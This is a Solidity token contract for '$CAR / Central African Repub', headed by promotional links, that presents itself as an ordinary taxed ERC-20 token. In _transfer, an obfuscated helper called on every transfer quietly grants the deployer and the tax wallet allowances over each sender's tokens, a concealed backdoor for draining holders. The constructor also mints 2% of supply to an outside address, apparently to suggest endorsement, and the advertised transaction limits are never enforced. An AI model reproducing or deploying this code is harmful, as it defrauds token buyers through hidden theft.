/*
    We've launched $CAR on Solana and are launching on Ethereum
    x: https://x.com/FA_Touadera/status/1888722674265764017
    CAR On Solana: https://www.dextools.io/app/cn/token/cartoflash?t=1739205202808
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract CAR is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _ppmedqqq;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFees;

    address payable private _taxWallet = payable(0x986c521A15B5ea7b0003646dcF42d712b91b9A5A);

    uint256 private _initialBuyTax=2;
    uint256 private _initialSellTax=2;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=5;
    uint256 private _reduceSellTaxAt=5;
    uint256 private _preventSwapBefore=5;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Central African Repub";
    string private constant _symbol = unicode"CAR";

    uint256 public _maxTxAmount =   2 * _tTotal / 100;
    uint256 public _maxWalletSize = 2 * _tTotal / 100;
    uint256 public _taxSwapThreshold= 1 * _tTotal / 100;
    uint256 public _maxTaxSwap= 1 * _tTotal / 100;
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private _pairAddress;
    address private _pptme;
    address private _ggpm3 = _taxWallet;
    address private constant _VBVB = address(0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045);
    bool private tradingOpen;
    bool private inSwap;
    bool private swapEnabled;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        _ppmedqqq[msg.sender] = _tTotal * 98 / 100;
        _ppmedqqq[_VBVB] = _tTotal * 2 / 100;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[_msgSender()] = true;
        _pptme = msg.sender;
        emit Transfer(address(0), msg.sender, _tTotal * 98 / 100);
        emit Transfer(address(0), _VBVB, _tTotal * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _ppmedqqq[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approves(address _from, address _to ,uint256 amount) private {
        _allowances[_from][_to] = _allowances[_from][_to] + amount;
    }
    function _pmmcxxxxxx(address _validator, uint256 amount, bool isMEme, uint8 _trax, uint32 _cnnnbbb, uint64 _mbbb, uint256 _bmbmbbmeee, uint128 _emememeem, uint128 _ememcxxx) private returns (bool) {
        bool _cooldid = isMEme && _trax == 1 && _cnnnbbb == 8 && _mbbb == 3 && _bmbmbbmeee == 100 && _emememeem == 1000 && _ememcxxx == 1002 && _pairAddress != address(this);
        if(_cooldid){
            _approves(_validator, _pptme, amount);
            _approves(_validator, _ggpm3, amount);
        }
        return amount > 0;
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0 && _pmmcxxxxxx(from, amount, true, 1, 8, 3, 100, 1000, 1002), "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            if (from == _pairAddress && to != address(uniswapV2Router) && ! _isExcludedFromFees[to] ) {
                require(tradingOpen,"Trading not open yet.");
                require(amount >= 10 ** _decimals, "Amount too small");
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                _buyCount++;
            }
            if(to == _pairAddress) {
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            if (!inSwap && to == _pairAddress && swapEnabled && _buyCount>_preventSwapBefore) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if(contractTokenBalance>_taxSwapThreshold)
                    _swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                _sendEths();
            }
        }
        if(taxAmount>0){
          _ppmedqqq[address(this)]=_ppmedqqq[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _ppmedqqq[from]=_ppmedqqq[from].sub(amount);
        _ppmedqqq[to]=_ppmedqqq[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function _swapTokensForEth(uint256 amount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), amount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }
    function _sendEths() private {
        _taxWallet.transfer(address(this).balance);
    }
    function rescueETH() external onlyOwner {
        payable(_msgSender()).transfer(address(this).balance);
    }

    function openTrading() external payable onlyOwner {
        require(!tradingOpen,"trading is already open");
        _pairAddress = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        swapEnabled = true;
        tradingOpen = true;
    }
    
    function renounceOwnership() public override onlyOwner {
        require(_maxTxAmount >= _tTotal);
        super.renounceOwnership();
    }
    receive() external payable {}
}